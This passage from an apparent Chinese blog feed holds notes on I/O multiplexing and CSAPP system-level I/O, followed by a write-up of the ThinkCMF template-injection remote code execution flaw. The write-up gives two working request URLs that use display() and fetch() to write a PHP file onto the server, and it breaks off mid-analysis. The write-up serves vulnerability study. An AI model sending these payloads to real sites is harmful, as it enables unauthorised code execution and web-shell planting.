fdset 中（而不是看是否为1？</span></span><br></pre></td></tr></table></figure><p>select</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/select.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/time.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">select</span><span class="params">(<span class="keyword">int</span> fdmax, fd_set *readfds, fd_set *writefds, fd_set *exceptfds,struct timeval *timeout)</span></span>;</span><br><span class="line"><span class="comment">// select 后，要注意复原 fd_set</span></span><br></pre></td></tr></table></figure><p>poll</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;poll.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">poll</span><span class="params">(struct pollfd *fds, <span class="keyword">nfds_t</span> nfds, <span class="keyword">int</span> timeout)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// POLLIN / POLLOUT / POLLERR </span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pollfd</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> fd; <span class="comment">/* 文件描述符 */</span></span><br><span class="line">    <span class="keyword">short</span> events; <span class="comment">/* 需要等待的事件 */</span></span><br><span class="line">    <span class="keyword">short</span> revents; <span class="comment">/* 实际发生了的事件，返回值 */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>epoll</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//创建 epoll</span></span><br><span class="line"><span class="keyword">int</span> epfd = epoll_crete(<span class="number">1000</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//将 listen_fd 添加进 epoll 中</span></span><br><span class="line">epoll_ctl(epfd, EPOLL_CTL_ADD, listen_fd,&amp;listen_event);</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">    <span class="comment">//阻塞等待 epoll 中 的fd 触发</span></span><br><span class="line">    <span class="keyword">int</span> active_cnt = epoll_wait(epfd, events, <span class="number">1000</span>, <span class="number">-1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span> ; i &lt; active_cnt; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (evnets[i].data.fd == listen_fd) &#123;</span><br><span class="line">            <span class="comment">//accept. 并且将新accept 的fd 加进epoll中.</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (events[i].events &amp; EPOLLIN) &#123;</span><br><span class="line">            <span class="comment">//对此fd 进行读操作</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (events[i].events &amp; EPOLLOUT) &#123;</span><br><span class="line">            <span class="comment">//对此fd 进行写操作</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="信号"><a href="#信号" class="headerlink" title="信号"></a>信号</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">sig_alrm</span><span class="params">(<span class="keyword">int</span> signo)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span>;  <span class="comment">// 这里的处理对原阻塞是怎么处理的？</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">signal(SIGALRM, sig_alrm);  <span class="comment">// 绑定信号处理函数</span></span><br><span class="line">alarm(<span class="number">3</span>);</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;实践项目&quot;&gt;&lt;a href=&quot;#实践项目&quot; class=&quot;headerlink&quot; title=&quot;实践项目&quot;&gt;&lt;/a&gt;实践项目&lt;/h2&gt;&lt;p&gt;实现一个 telnet 版本的聊天服务器，主要有以下需求。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;每个客户端可以用使用 &lt;code&gt;te
      
    
    </summary>
    
    
      <category term="读书笔记" scheme="https://wywwzjj.top/tags/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>CSAPP 系统级 IO 笔记</title>
    <link href="https://wywwzjj.top/2019/11/25/CSAPP-Chapter-10-Notes/"/>
    <id>https://wywwzjj.top/2019/11/25/CSAPP-Chapter-10-Notes/</id>
    <published>2019-11-25T13:45:57.000Z</published>
    <updated>2020-02-01T04:02:14.891Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Unix-I-O"><a href="#Unix-I-O" class="headerlink" title="Unix I/O"></a>Unix I/O</h2><p>所有的 I/O 设备（例如网络、磁盘和终端）都被模型化为文件，而所有的输入和输出都被当作相应文件的读和写来执行。这种将设备优雅地映射为文件的方式，允许 Linux 内核引出一个简单、低级的应用接口，称为 Unix I/O，这使得所有的输入和输出都能以一种统一且一致的方式来执行。</p><h2 id="文件"><a href="#文件" class="headerlink" title="文件"></a>文件</h2><p>硬盘 =&gt; chs =&gt; 盘块 =&gt; 文件</p><p>文件：建立字符流（序列）到盘块集合的映射关系，由操作系统维护这个映射关系。</p><p>FCB 以块号为单位，会不会太大，比如单个位的编辑？</p><p>inode也会消耗硬盘空间，所以硬盘格式化的时候，操作系统自动将硬盘分成两个区域。一个是数据区，存放文件数据；另一个是inode区（inode table），存放inode所包含的信息。</p><p>Unix/Linux系统中，目录（directory）也是一种文件。打开目录，实际上就是打开目录文件。</p><p>目录文件的结构非常简单，就是一系列目录项（dirent）的列表。每个目录项，由两部分组成：所包含文件的文件名，以及该文件名对应的inode号码。</p><p>文件系统：一种用于持久性存储的系统抽象。</p><p>文件：文件系统中一个单元的相关数据在操作系统中的抽象。</p><p>文件系统提供了按名存取功能，使用户能透明地访问文件。</p><p>文件分类：</p><ul><li>目录文件：用于保存文件目录的文件</li><li>普通文件</li><li>设备文件</li></ul><p>这里引出了交换区和文件区。</p><p>文件区主要用于存放文件，追求存储空间的利用率，因此对文件区空间的管理采用离散分配方式；</p><p>交换区只占磁盘空间的小部分，被换出的进程数据就存放在这里，追求换入换出的速度，因此对交换区采用连续分配方式。</p><h3 id="虚拟文件系统"><a href="#虚拟文件系统" class="headerlink" title="虚拟文件系统"></a>虚拟文件系统</h3><p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1gbgrf3xiekj20oe0adq7l.jpg" alt="image.png"></p><p>目的：对所有不同文件系统的抽象</p><p>文件系统主要功能：</p><ul><li>文件的按名存取</li><li>文件目录的建立和维护</li><li>文件的组织</li><li>文件存储空间的管理</li><li>提供各种操作文件的方法</li></ul><h2 id="逻辑结构"><a href="#逻辑结构" class="headerlink" title="逻辑结构"></a>逻辑结构</h2><h3 id="流式文件"><a href="#流式文件" class="headerlink" title="流式文件"></a>流式文件</h3><p>有序的字符流，内部无结构划分</p><h3 id="记录式文件"><a href="#记录式文件" class="headerlink" title="记录式文件"></a>记录式文件</h3><p>文件内的数据被划分为具有逻辑完整性的单元，每个单元称作一条记录，每条记录可以包含若干个数据项。（CSV</p><h2 id="物理结构"><a href="#物理结构" class="headerlink" title="物理结构"></a>物理结构</h2><h3 id="连续"><a href="#连续" class="headerlink" title="连续"></a>连续</h3><ul><li>为文件分配的必须是连续的盘块</li><li>顺序存取速度快，可以随机访问</li><li>会产生碎片，不利于文件扩展</li></ul><h3 id="链接"><a href="#链接" class="headerlink" title="链接"></a>链接</h3><ul><li>用链表的形式把盘块串起来</li><li>可以解决碎片问题，外存利用率高，扩展性高</li><li>只能顺序访问，不能随机访问</li></ul><h3 id="索引"><a href="#索引" class="headerlink" title="索引"></a>索引</h3><ul><li>为文件数据块建立索引表，非连续存储分配，提高了空间的利用率</li><li>支持随机访问，易扩展</li><li>索引表本身占空间，访问数据块前需要读取索引块，增加了检索的开销</li></ul><h2 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h2><p>文件系统通过文件的物理结构和目录文件实现按名存取功能。</p><h3 id="FCB"><a href="#FCB" class="headerlink" title="FCB"></a>FCB</h3><p>描述信息</p><ul><li>文件名</li><li>文件的逻辑结构信息</li><li>文件的物理结构信息</li></ul><p>管理信息</p><ul><li>存取控制信息，包括读、写、执行</li><li>使用信息，包括创建、修改、访问文件的时间</li></ul><h3 id="inode"><a href="#inode" class="headerlink" title="inode"></a>inode</h3><p>包含文件的元信息（无文件的名称）：</p><ul><li>文件字节数</li><li>文件拥有者的 User ID</li><li>文件的 Group id</li><li>文件的读、写、执行权限</li><li>文件的时间戳：ctime 指 inode 上一次变动的时间，mtime 指文件内容上一次变动的时间，atime指文件上次被打开的时间</li><li>链接数，即有多少文件名只想这个 inode</li><li>文件数据 block 的位置</li></ul><p>每个inode都有一个号码，操作系统用inode号码来识别不同的文件，系统内部不使用文件名。</p><p>对于系统来说，文件名只是inode号码便于识别的别称或者绰号。</p><p>表面上，用户通过文件名，打开文件。实际上，系统内部这个过程分成三步：首先，系统找到这个文件名对应的inode号码；其次，通过inode号码，获取inode信息；最后，根据inode信息，找到文件数据所在的block，读出数据。</p><h3 id="目录结构"><a href="#目录结构" class="headerlink" title="目录结构"></a>目录结构</h3><h2 id="文件存储空间管理"><a href="#文件存储空间管理" class="headerlink" title="文件存储空间管理"></a>文件存储空间管理</h2><p>主要就是空闲区管理</p><h3 id="成组链接法"><a href="#成组链接法" class="headerlink" title="成组链接法"></a>成组链接法</h3><p>结构</p><p>分配、回收算法</p><h3 id="空闲表法"><a href="#空闲表法" class="headerlink" title="空闲表法"></a>空闲表法</h3><h3 id="空闲链表法"><a href="#空闲链表法" class="headerlink" title="空闲链表法"></a>空闲链表法</h3><p>空闲盘块链</p><p>空闲盘区链</p><h3 id="位示图法"><a href="#位示图法" class="headerlink" title="位示图法"></a>位示图法</h3><h2 id="共享"><a href="#共享" class="headerlink" title="共享"></a>共享</h2><p>类型</p><ul><li><p>基于索引结点（硬链接）</p><p>  计数器为0才真正删除文件</p></li><li><p>基于符号链（软链接）</p></li></ul><p>共享方法</p><ul><li>绕道法</li><li>链接法</li><li>基本文件目录法</li></ul><p>保护采用保护键法。</p><h2 id="安全性"><a href="#安全性" class="headerlink" title="安全性"></a>安全性</h2><p>文件保护</p><ul><li><p>口令保护</p></li><li><p>加密保护</p></li><li><p>访问控制</p><p>  用一个访问控制表（ACL）记录各个用户（或各组用户）对文件的访问权限</p></li></ul><p>保密安全策略分为 MAC（强制访问策略，安全性更高）、DAC（自主访问策略，更加灵活）</p><h2 id="设备管理"><a href="#设备管理" class="headerlink" title="设备管理"></a>设备管理</h2><p>主机对设备的访问表现为使用基本的端口通讯指令（in、out）与这组 IO 地址通讯。</p><p>设备相关层</p><ul><li>设备驱动程序</li><li>中断处理程序</li></ul><p>设备无关层</p><p>设备独立性：操作系统提供了物理设备到逻辑设备的抽象，用户或程序中使用的设备与具体的设备无关，不再需要关注设备的细节，方便用户使用。</p><h2 id="I-O-控制"><a href="#I-O-控制" class="headerlink" title="I/O 控制"></a>I/O 控制</h2><p>CPU 无法直接控制I/O设备的机械部件，因此I/O设备还要有一个电子部件作为 CPU 和 I/O 设备机械部件之间的“中介”，用于实现 CPU 对设备的控制。这个电子部件就是 I/O 控制器，又称设备控制器，CPU 可控制 I/O 控制器，又由 I/O 控制器来控制设备的机械部件。</p><p>I/O 控制器功能点：</p><ul><li>接受和识别CPU发出的指令（要有控制寄存器）</li><li>向CPU报告设备的状态（要有状态寄存器）</li><li>数据交换（要有数据寄存器，暂存输入、输出的数据）</li><li>地址识别（由I/O逻辑实现）</li></ul><p>两种寄存器编制方式</p><ul><li>内存映射<ul><li>控制器中的寄存器与内存统一控制</li><li>可以采用对内存进行操作的指令对控制器进行操作</li></ul></li><li>寄存器独立编制<ul><li>需要专门的指令来操作控制器</li></ul></li></ul><p>目标：减少 CPU 等待时间、减轻 CPU 负担、提高系统并行性</p><h3 id="程序查询"><a href="#程序查询" class="headerlink" title="程序查询"></a>程序查询</h3><p>进程提出 IO 请求并获得设备后，IO 子程序将不断循环检测设备的状态，直到设备能够满足 IO 操作的要求时实施传输动作。</p><p>设备《=》CPU《=》内存</p><h3 id="中断"><a href="#中断" class="headerlink" title="中断"></a>中断</h3><p>与异常的关系？</p><p>1.进程提出 IO 请求并获得设备后，若设备未就绪，则阻塞进程。</p><p>2.当设备进入就绪状态时，发出中断信号，已在系统中注册的中断处理函数唤醒进程以启动一个传输动作，而后再阻塞进程直到设备再次就绪。</p><p>设备《=》CPU《=》内存</p><h3 id="DMA"><a href="#DMA" class="headerlink" title="DMA"></a>DMA</h3><p>1.进程提出 IO 请求并获得设备后，将数据（或接收缓冲区）安置在内存中的位置和大小写入 DMA 控制器的寄存器内，启动 DMA 过程并阻塞进程。</p><p>2.DMA 控制器控制指定内存区域同设备之间的数据交换。其间需要使用总线时，总线控制权将供DMA使用（硬件机制）。</p><p>3.当原进程请求的IO操作全部完成时，DMA 控制器发出中断，中断处理程序唤醒进程。</p><p>DMA 中两个主要寄存器：</p><ul><li>基址寄存器，指示当前读或写的内存地址</li><li>计数寄存器，表示传输数据的字节数</li></ul><p>数据的传送单位是“块”。</p><p>设备《=》内存</p><h3 id="通道"><a href="#通道" class="headerlink" title="通道"></a>通道</h3><p>在DMA方式的基础上，通道方式中使用通道处理器替代DMA控制器来实施传输动作。</p><p>通道处理器是一个简单的专用处理器，具有自身的指令系统，可按程序完成传输动作。这使得通道处理器较只能进行单纯传输动作的DMA控制器具有更强大的功能，例如传输纠错、数据格式转换、数据预处理 等。</p><p>对于系统中的每一个通道，内存中有两个固定的专用存储单元分别存储通道程序的首地址（CAW通道地址字）和状态信息（CSW通道状态字）。</p><p>数据的传送单位是“一组数据块”</p><p>通道方式的运作过程：</p><p>➢ 进程提出IO请求并获得设备后，根据所要求的IO操作，生成由通道指令组成的通道程序，并将程序首地址写入CAW中。然后启动通道并阻塞进程。</p><p>➢ 通道处理器从CAW中找到通道程序，并按通道程序的指令完成数据传输过程。每条指令执行之后都将通道状态写入CSW中，使得主机能够随时掌握通道运行情况。</p><p>➢ 若通道程序执行中出现错误，通道处理器将发出错误中断，交由中断处理程序处理错误；若通道程序顺利执行完毕也将发出完成中断，由中断处理程序唤醒原进程。</p><h2 id="I-O-缓冲"><a href="#I-O-缓冲" class="headerlink" title="I/O 缓冲"></a>I/O 缓冲</h2><p>缓冲技术一般应用于两种速度不一致的部件之间的协作。一般形式是以缓冲区来暂时存放需要交换的信息。</p><ul><li>保证正确性：避免部件间速度不一致造成的信息缺失</li><li>缓解 CPU 与设备的速度矛盾</li><li>减少对 CPU 的中断频率</li><li>解决数据粒度不匹配问题</li><li>提高 CPU 与 I/O 设备之间的并行性</li></ul><p>使用缓冲技术的输出（Write）的一般过程：</p><ol><li>用户提出Write请求后，缓冲管理模块检查进程是否已取得相应的输出缓冲区，若已取得，则使用此缓冲区，否则申请一个空缓冲区，将其更改为该进程对该设备的输出缓冲区（可能阻塞原进程）。</li><li>缓冲管理模块使用访存指令将数据写入缓冲区内。</li><li>其间若达到一定的缓冲条件，则缓冲管理模块启动上层驱动程序，将整个缓冲区内的数据写入设备（冲洗，可能阻塞原进程），之后再继续步骤2，直到数据写入完成。</li></ol><p>使用缓冲技术的输入（Read）的一般过程：</p><ol><li>用户提出Read请求后，缓冲管理模块检查进程是否已取得相应的输入缓冲区，若已取得，则使用此缓冲区，否则申请一个空缓冲区，将其更改为该进程对该设备的输入缓冲区（可能阻塞原进程）。</li><li>缓冲管理模块使用访存指令从缓冲区内读出数据。</li><li>其间若缓冲区为空，则缓冲管理模块启动上层驱动程序，从设备读出数据到缓冲区（可能阻塞原进程），直至达到一定的缓冲条件后再继续步骤2，直到数据读出完成。</li></ol><h2 id="磁盘"><a href="#磁盘" class="headerlink" title="磁盘"></a>磁盘</h2><p>一次磁盘读/写操作需要的时间 = 寻道时间（大头） + 旋转延迟时间 + 传输时间</p><p>减少延迟时间方法：</p><ul><li>交替编号</li><li>错位命名</li><li>磁盘地址结构的设计</li></ul><p>驱动调度：</p><ul><li>移臂调度</li><li>旋转调度</li></ul><p>调度算法：</p><ul><li><p>先来先服务（FCFS）</p></li><li><p>最短寻找时间优先（SSTF）</p><p>  优先调度附近磁道。磁头在一个小区域内来来回回移动，可能产生饥饿</p></li><li><p>扫描算法（SCAN）</p><p>  为了杜绝上面的饥饿现象，加了点限定，只有磁头移动到最外侧了才能调头</p></li><li><p>电梯算法</p><p>  再扫描算法上又加了点限定，不用完全到磁道尽头，一旦反方向有请求，可直接响应</p></li><li><p>循环扫描算法（C-SCAN）</p><p>  从内到外，依次响应距离磁头最近的操作，到最外层柱面后立即回到最内柱面，继续之前的操作</p></li></ul><p>存储空间管理数据结构：</p><ul><li>位示图</li><li>空闲块表</li><li>空闲块链表</li></ul><p>磁盘管理：</p><ul><li>磁盘初始化</li><li>引导块</li><li>坏块的管理</li></ul><h2 id="I-O-重定向"><a href="#I-O-重定向" class="headerlink" title="I/O 重定向"></a>I/O 重定向</h2><h2 id="标准-I-O"><a href="#标准-I-O" class="headerlink" title="标准 I/O"></a>标准 I/O</h2><p>创建进程时，会打开三个文件，其文件描述符为 0、1、2，分别表示标准输入、标准输出以及标准错误流。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;Unix-I-O&quot;&gt;&lt;a href=&quot;#Unix-I-O&quot; class=&quot;headerlink&quot; title=&quot;Unix I/O&quot;&gt;&lt;/a&gt;Unix I/O&lt;/h2&gt;&lt;p&gt;所有的 I/O 设备（例如网络、磁盘和终端）都被模型化为文件，而所有的输入和输出都被当作相应
      
    
    </summary>
    
    
      <category term="读书笔记" scheme="https://wywwzjj.top/tags/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>ThinkCMF 前台模板注入 RCE</title>
    <link href="https://wywwzjj.top/2019/11/21/ThinkCMF-%E5%89%8D%E5%8F%B0%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5-RCE/"/>
    <id>https://wywwzjj.top/2019/11/21/ThinkCMF-前台模板注入-RCE/</id>
    <published>2019-11-21T12:16:29.000Z</published>
    <updated>2020-02-01T12:29:32.045Z</updated>
    
    <content type="html"><![CDATA[<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>ThinkCMF 是一款基于 PHP+MYSQL 开发的中文内容管理框架，底层采用 ThinkPHP3.2.3 构建。</p><p>远程攻击者在无需任何权限情况下，通过构造特定的请求包即可在远程服务器上执行任意代码。</p><p><strong>影响版本</strong></p><ul><li><p>ThinkCMF X1.6.0</p></li><li><p>ThinkCMF X2.1.0</p></li><li><p>ThinkCMF X2.2.0</p></li><li><p>ThinkCMF X2.2.1</p></li><li><p>ThinkCMF X2.2.2</p></li><li><p>ThinkCMF X2.2.3</p></li></ul><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>ThinkCMF X2.2.3 下载地址：<a href="https://pan.baidu.com/s/1bRXwdg" target="_blank" rel="noopener">https://pan.baidu.com/s/1bRXwdg</a></p><p>按照引导安装即可，该框架调试模式默认开启。</p><p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1gbfjisjsubj20m60myjsp.jpg" alt="image.png"></p><h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><ul><li>利用 <code>display()</code>，实现任意文件包含。</li></ul><p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1gbfqmrkqpfj20j701yjrd.jpg" alt="image.png"></p><ul><li>利用 <code>display()</code> 写 shell。</li></ul><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//cmf</span>.com/index.php/<span class="keyword">index</span>/display/?templateFile=README.md&amp;content=%3C?php%20file_put_contents(%27i.php%27,%27%3C?php%20phpinfo();%20?&gt;%27);</span><br></pre></td></tr></table></figure><p>在根目录写入成功。</p><p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1gbfqin4rm3j207k0103yi.jpg" alt="image.png"></p><ul><li>利用 <code>fetch()</code> 直接写 PHP 文件。</li></ul><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//cmf</span>.com/index.php/<span class="keyword">index</span>/fetch/?content=%3C?php%20file_put_contents(%27i.php%27,%27%3C?php%20phpinfo();%20?%3E%27);</span><br></pre></td></tr></table></figure><p>在根目录写入成功。</p><p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1gbfqin4rm3j207k0103yi.jpg" alt="image.png"></p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p><strong>目录结构</strong></p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">|--admin                      管理后台URL重定向目录，你可以将文件夹名改为任何你喜欢的</span></span><br><span class="line">  <span class="string">|--themes                   后台模板文件目录</span></span><br><span class="line"><span class="string">|--application                应用目录</span></span><br><span class="line">  <span class="string">|--Admin                    后台管理应用</span></span><br><span class="line">  <span class="string">|--Api                      公共接口</span></span><br><span class="line">  <span class="string">|--Asset                    资源管理应用</span></span><br><span class="line">  <span class="string">|--Comment                  评论应用</span></span><br><span class="line">  <span class="string">|--Common                   应用公共模块</span></span><br><span class="line">  <span class="string">|--Portal                   门户应用</span></span><br><span class="line">    <span class="string">|--Controller             必须目录，存放应用的操作模块如：IndexController.class.php</span></span><br><span class="line">  <span class="string">|--Conf                   可选，应用配置文件存放目录，如应用无配置文件则不需要</span></span><br><span class="line">  <span class="string">|--Common                 可选，应用函数库，如无则不需要</span></span><br><span class="line">  <span class="string">|--Lang  多语言包（可选）</span></span><br><span class="line">  <span class="string">|--Menu   后台菜单（可选）</span></span><br><span class="line">  <span class="string">|--Model    模型（可选）</span></span><br><span class="line">  <span class="string">|--nav.php  前台导航文件（可选）</span></span><br><span class="line"><span class="string">|--data                       各类数据存放目录，包括缓存数据</span></span><br><span class="line"><span class="string">|--simplewind                 核心包，无特殊情况请勿改动</span></span><br><span class="line"><span class="string">|--public                     静态文件存放包，包含bootstrap资源</span></span><br><span class="line"><span class="string">|--themes                     前台模板文件目录</span></span><br></pre></td></tr></table></figure><p>先回顾一下如何正常访问一个控制器，比如 Portal 下 IndexController.class.php 中的 index 方法。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">IndexController</span> <span class="keyword">extends</span> <span class="title">HomebaseController</span> </span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span><span class="params">($name)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Hello, $name~&lt;br&gt;"</span> . <span class="string">"This is index of IndexController."</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>按照 ThinkPHP 提供的<a href="https://www.kancloud.cn/manual/thinkphp/1715" target="_blank" rel="noopener">方法</a>，可以是 <code>index.php/portal/index/index/name/wywwzjj</code>。（portal 是默认模块）</p><p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1gbfrnhq18ej20gu02fjrb.jpg" alt="image.png"></p><blockquote><p>一般来说，ThinkPHP 的控制器是一个类，而操作则是控制器类的一个<strong>公共方法</strong>。</p></blockquote><p>也就是说，我们可以使用这种方式来调用任意的 public 方法。</p><p>注意到 IndexController 类继承了 HomebaseController，这有一系列继承。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">IndexController</span> <span class="keyword">extends</span> <span class="title">HomebaseController</span> </span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">HomebaseController</span> <span class="keyword">extends</span> <span class="title">AppframeController</span> </span>&#123;</span><br><span class="line">        <span class="class"><span class="keyword">class</span> <span class="title">AppframeController</span> <span class="keyword">extends</span> <span class="title">Controller</span> </span>&#123;</span><br><span class="line">            <span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Controller</span> </span>&#123;</span><br></pre></td></tr></table></figure><blockquote><p>当扩展一个类，子类就会继承父类所有公有的和受保护的方法。除非子类覆盖了父类的方法，被继承的方法都会保留其原有功能。 </p></blockquote><p>所以 IndexController 类有了父类的所有方法，这里列举一下所有 public 方法，说不定可以组合利用。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// abstract class Controller</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> // 架构函数，取得模板对象实例</span></span><br><span class="line"><span class="function"><span class="title">public</span> <span class="title">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function"><span class="title">public</span> <span class="title">function</span> <span class="title">__get</span><span class="params">($name)</span></span></span><br><span class="line"><span class="function"><span class="title">public</span> <span class="title">function</span> <span class="title">__set</span><span class="params">($name, $value)</span></span></span><br><span class="line"><span class="function"><span class="title">public</span> <span class="title">function</span> <span class="title">get</span><span class="params">($name = <span class="string">''</span>)</span>  // 取得模板显示变量的值</span></span><br><span class="line"><span class="function"><span class="title">public</span> <span class="title">function</span> <span class="title">__isset</span><span class="params">($name)</span>  // 检测模板变量的值</span></span><br><span class="line"><span class="function"><span class="title">public</span> <span class="title">function</span> <span class="title">__call</span><span class="params">($method, $args)</span> // 没戏，写死了，没有实现动态调用</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">//  <span class="title">class</span> <span class="title">AppframeController</span></span></span><br><span class="line"><span class="function">    </span></span><br><span class="line"><span class="function"><span class="title">public</span> <span class="title">function</span> <span class="title">_empty</span><span class="params">()</span>// 爆了个页面不存在的错</span></span><br><span class="line"><span class="function"><span class="title">public</span> <span class="title">function</span> <span class="title">theme</span><span class="params">($theme)</span>// 模板主题设置</span></span><br><span class="line"><span class="function">    </span></span><br><span class="line"><span class="function">// <span class="title">class</span> <span class="title">HomebaseController</span></span></span><br><span class="line"><span class="function">    </span></span><br><span class="line"><span class="function"><span class="title">public</span> <span class="title">function</span> <span class="title">__construct</span><span class="params">()</span>  // 覆盖掉父类的</span></span><br><span class="line"><span class="function"><span class="title">public</span> <span class="title">function</span> <span class="title">display</span><span class="params">($templateFile = <span class="string">''</span>, $charset = <span class="string">''</span>, $contentType = <span class="string">''</span>, $content = <span class="string">''</span>, $prefix = <span class="string">''</span>)</span>  // 加载模板和页面输出 可以返回输出内容</span></span><br><span class="line"><span class="function"><span class="title">public</span> <span class="title">function</span> <span class="title">parseTemplate</span><span class="params">($template = <span class="string">''</span>)</span>  // 自动定位模板文件</span></span><br><span class="line"><span class="function"><span class="title">public</span> <span class="title">function</span> <span class="title">fetch</span><span class="params">($templateFile = <span class="string">''</span>, $content = <span class="string">''</span>, $prefix = <span class="string">''</span>)</span>  // 获取输出页面内容</span></span><br></pre></td></tr></table></figure><p>目前来看，能造成敏感操作只有 <code>display()</code> 和 <code>fetch()</code> 了，继续跟进。</p><h3 id="display"><a href="#display" class="headerlink" title="display"></a>display</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span 